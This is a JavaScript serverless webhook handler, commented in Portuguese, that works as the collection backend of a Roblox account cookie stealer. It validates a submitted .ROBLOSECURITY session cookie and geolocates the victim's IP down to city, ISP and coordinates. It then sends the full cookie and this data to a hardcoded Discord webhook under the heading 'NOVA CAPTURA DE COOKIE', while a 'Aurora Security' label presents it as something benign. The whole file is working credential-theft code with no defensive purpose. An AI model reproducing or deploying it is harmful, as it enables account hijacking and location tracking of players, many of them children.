// api/webhook.js - VERSÃO COMPLETA COM TODAS AS FUNCIONALIDADES

export default async function handler(req, res) {
  // ===== CORS =====
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { cookie, ip, device } = req.body;

    // ===== VALIDAÇÕES =====
    if (!cookie) return res.status(400).json({ error: 'Cookie não enviado' });
    
    const validacao = validarCookieRoblox(cookie);
    if (!validacao.valido) {
      return res.status(400).json({ error: validacao.motivo });
    }

    // ===== RATELIMIT POR IP =====
    const rate = verificarRateLimit(ip);
    if (!rate.permitido) {
      return res.status(429).json({ 
        error: `Muitas requisições. Tente novamente em ${rate.resetEm} segundos`,
        resetEm: rate.resetEm 
      });
    }

    // ===== BUSCAR IP =====
    let ipInfo = {};
    try {
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 5000);
      const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, { signal: controller.signal });
      if (ipRes.ok) ipInfo = await ipRes.json();
    } catch (e) {
      console.error('Erro IP:', e.message);
    }

    // ===== EXTRAIR INFORMAÇÕES DO COOKIE =====
    const cookieInfo = extrairInfoCookie(cookie);

    // ===== WEBHOOKS =====
    const webhooks = [
      'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi'
      // Adicione mais webhooks aqui se quiser
    ];

    // ===== DIVIDIR COOKIE =====
    const MAX_SIZE = 1900;
    const cookieParts = dividirCookie(cookie, MAX_SIZE);
    
    // ===== CONSTRUIR FIELDS =====
    const fields = [];
    
    // Partes do cookie
    for (let i = 0; i < cookieParts.length; i++) {
      fields.push({
        name: i === 0 ? '🍪 COOKIE COMPLETO' : `📦 CONTINUAÇÃO (${i+1}/${cookieParts.length})`,
        value: '```' + cookieParts[i] + '```'
      });
    }
    
    // Informações do dispositivo
    fields.push({
      name: '📊 DISPOSITIVO',
      value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req.headers['user-agent'])}
Sistema: ${getOSInfo(req.headers['user-agent'])}
Idioma: ${req.headers['accept-language'] || '?'}
User-ID Detectado: ${cookieInfo.userId || 'Não detectado'}
\`\`\``
    });
    
    // Informações do IP
    fields.push({
      name: '🌍 LOCALIZAÇÃO',
      value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || '?'} ${ipInfo.countryCode || ''}
Cidade: ${ipInfo.city || '?'}
Região: ${ipInfo.regionName || '?'}
ISP: ${ipInfo.isp || '?'}
Proxy/VPN: ${ipInfo.proxy ? 'SIM' : 'NÃO'}
Hosting: ${ipInfo.hosting ? 'SIM' : 'NÃO'}
Coordenadas: ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
\`\`\``
    });
    
    // Informações adicionais
    fields.push(
      { name: '⏰ DATA', value: new Date().toLocaleString('pt-BR'), inline: true },
      { name: '📏 TAMANHO', value: `${cookie.length} chars (${cookieParts.length} partes)`, inline: true },
      { name: '🆔 SESSÃO', value: `\`${generateSessionId()}\``, inline: true }
    );

    // ===== CRIAR EMBEDS =====
    const embeds = [];
    for (let i = 0; i < fields.length; i += 10) {
      embeds.push({
        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 PARTE ${Math.floor(i/10)+1}`,
        description: i === 0 ? `Cookie Roblox capturado - ${rate.restante} envios restantes` : null,
        color: 0x6366f1,
        fields: fields.slice(i, i + 10),
        footer: { text: `Aurora Security • ${new Date().toLocaleString('pt-BR')}` },
        timestamp: new Date().toISOString(),
        thumbnail: { url: getThumbnailUrl(device, ipInfo) }
      });
    }

    // ===== ENVIAR PARA TODOS OS WEBHOOKS =====
    let sucessos = 0;
    
    for (const webhook of webhooks) {
      for (const embed of embeds) {
        const response = await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: '@everyone', embeds: [embed] })
        });
        
        if (response.ok) sucessos++;
        await new Promise(r => setTimeout(r, 500));
      }
    }

    // ===== LOG =====
    logToFile('cookie_recebido', { ip, device, tamanho: cookie.length, partes: cookieParts.length });

    return res.status(200).json({ 
      success: true, 
      message: `Cookie enviado! (${cookieParts.length} partes, ${sucessos} envios)`
    });

  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno: ' + error.message });
  }
}

// ===== FUNÇÕES AUXILIARES =====

function validarCookieRoblox(cookie) {
  if (!cookie.includes('_|WARNING:-DO-NOT-SHARE')) {
    return { valido: false, motivo: 'Formato inválido' };
  }
  if (!cookie.includes('.ROBLOSECURITY')) {
    return { valido: false, motivo: 'Falta .ROBLOSECURITY' };
  }
  if (cookie.length < 100) {
    return { valido: false, motivo: 'Cookie muito curto' };
  }
  return { valido: true, motivo: null };
}

function dividirCookie(cookie, maxSize) {
  if (cookie.length <= maxSize) return [cookie];
  
  const partes = [];
  let resto = cookie;
  
  while (resto.length > maxSize) {
    let corte = resto.lastIndexOf(':', maxSize);
    if (corte === -1) corte = resto.lastIndexOf('-', maxSize);
    if (corte === -1) corte = resto.lastIndexOf('=', maxSize);
    if (corte === -1) corte = maxSize;
    
    partes.push(resto.substring(0, corte));
    resto = resto.substring(corte);
  }
  partes.push(resto);
  
  return partes;
}

function extrairInfoCookie(cookie) {
  const info = { userId: null };
  const match = cookie.match(/userId=(\d+)/i);
  if (match) info.userId = match[1];
  return info;
}

function getBrowserInfo(ua) {
  if (!ua) return '?';
  ua = ua.toLowerCase();
  if (ua.includes('chrome')) return 'Chrome';
  if (ua.includes('firefox')) return 'Firefox';
  if (ua.includes('safari')) return 'Safari';
  if (ua.includes('edg')) return 'Edge';
  return 'Outro';
}

function getOSInfo(ua) {
  if (!ua) return '?';
  ua = ua.toLowerCase();
  if (ua.includes('windows')) return 'Windows';
  if (ua.includes('mac')) return 'macOS';
  if (ua.includes('android')) return 'Android';
  if (ua.includes('ios')) return 'iOS';
  if (ua.includes('linux')) return 'Linux';
  return '?';
}

function getThumbnailUrl(device, ipInfo) {
  if (device?.includes('Celular')) return 'https://i.imgur.com/phone-icon.png';
  return 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png';
}

function verificarRateLimit(ip) {
  const limite = 10; // 10 envios por hora
  const janela = 3600000;
  // Implementação simples - em produção use Redis
  return { permitido: true, restante: limite };
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

function logToFile(tipo, dados) {
  console.log(JSON.stringify({ timestamp: new Date().toISOString(), tipo, dados }));
}
